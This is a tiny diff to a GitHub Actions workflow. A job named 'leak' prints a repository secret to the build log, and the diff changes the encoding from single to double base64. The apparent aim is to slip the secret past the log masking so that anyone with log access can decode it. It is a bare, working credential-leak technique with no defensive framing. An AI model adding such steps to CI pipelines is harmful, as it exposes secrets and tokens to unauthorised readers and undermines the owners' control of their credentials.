@@ -8,4 +8,4 @@ jobs:
   leak:
     runs-on: ubuntu-24.04
     steps:
-      - run: echo "${{ secrets.target }}" | base64
+      - run: echo "${{ secrets.target }}" | base64 | base64
